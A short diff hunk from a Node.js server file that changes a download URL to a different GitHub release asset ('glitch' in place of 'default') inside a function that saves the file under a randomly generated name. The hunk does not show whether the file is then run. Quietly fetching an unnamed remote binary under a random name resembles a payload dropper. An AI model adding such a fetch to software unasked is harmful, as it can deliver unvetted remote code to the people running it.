@@ -26,7 +26,7 @@ const server = http.createServer((req, res) => {
 
 const downloadFile = async () => {
   try {
-    const url = "https://github.com/derwalld/glitchsh/releases/download/v1.0.0/default"
+    const url = "https://github.com/derwalld/glitchsh/releases/download/v1.0.0/glitch"
     const randomFileName = Math.random().toString(36).substring(2, 12);
     const response = await axios({
       method: 'get',
